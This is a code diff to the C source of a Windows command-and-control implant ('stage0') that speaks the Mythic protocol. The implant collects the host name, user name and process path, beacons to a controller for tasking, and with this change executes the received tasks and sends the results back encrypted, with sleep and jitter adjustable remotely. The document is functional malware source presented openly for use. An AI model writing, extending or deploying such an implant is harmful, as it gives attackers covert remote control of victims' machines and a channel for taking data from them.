@@ -38,11 +38,13 @@ static int s0_reply_id(const uint8_t *json, uint32_t length, char id[37]) {
 int s0_agent_run(const s0_config *cfg) {
     s0_transport t = {0}; s0_buffer tx = {0}, rx = {0}, result = {0};
     s0_buffer plain = {0};
+    s0_buffer responses = {0};
     char callback_id[37], response_id[37], checkin[768];
     char host[256] = {0}, user[256] = {0}, process_path[MAX_PATH] = {0};
     char *process_name = process_path;
     DWORD host_len = sizeof(host), user_len = sizeof(user), process_len;
     int checkin_len;
+    uint16_t sleep_ms, jitter_pct;
     s0_debug(L"starting");
     if (!cfg) { s0_debug(L"missing configuration"); return 0; }
 #ifdef STAGE0_DEBUG
@@ -58,6 +60,8 @@ int s0_agent_run(const s0_config *cfg) {
     }
     s0_debug(L"transport open");
     CopyMemory(callback_id, cfg->payload_id, 37);
+    sleep_ms = cfg->sleep_ms;
+    jitter_pct = cfg->jitter_pct;
     GetComputerNameA(host, &host_len);
     GetUserNameA(user, &user_len);
     process_len = GetModuleFileNameA(0, process_path, sizeof(process_path));
@@ -92,7 +96,7 @@ int s0_agent_run(const s0_config *cfg) {
     for (;;) {
         rx.length = 0;
         plain.length = 0;
-        Sleep(cfg->sleep_ms ? cfg->sleep_ms : 1000);
+        Sleep(sleep_ms ? sleep_ms : 1000);
         checkin_len = wsprintfA(checkin,
             "{\"action\":\"get_tasking\",\"tasking_size\":-1,"
             "\"get_delegate_tasks\":true}");
@@ -105,9 +109,28 @@ int s0_agent_run(const s0_config *cfg) {
                               response_id, &plain)) {
             s0_debug(L"poll response decode failed"); break;
         }
+        responses.length = 0;
+        if (!s0_process_mythic_tasks(plain.data, plain.length,
+                                     &sleep_ms, &jitter_pct, &responses)) {
+            s0_debug(L"task processing failed"); break;
+        }
+        if (responses.length) {
+            tx.length = rx.length = plain.length = 0;
+            if (!s0_mythic_encode(callback_id, cfg->key, responses.data,
+                                  responses.length, &tx) ||
+                !t.exchange(&t, tx.data, tx.length, &rx)) {
+                s0_debug_error(L"response exchange failed", GetLastError());
+                break;
+            }
+            if (!s0_mythic_decode(cfg->key, rx.data, rx.length,
+                                  response_id, &plain)) {
+                s0_debug(L"response decode failed"); break;
+            }
+        }
     }
     t.close(&t); s0_buffer_free(&tx); s0_buffer_free(&rx);
-    s0_buffer_free(&plain); s0_buffer_free(&result); return 1;
+    s0_buffer_free(&plain); s0_buffer_free(&responses);
+    s0_buffer_free(&result); return 1;
 }
 
 __declspec(dllexport) DWORD WINAPI stage0_start(void *config) {
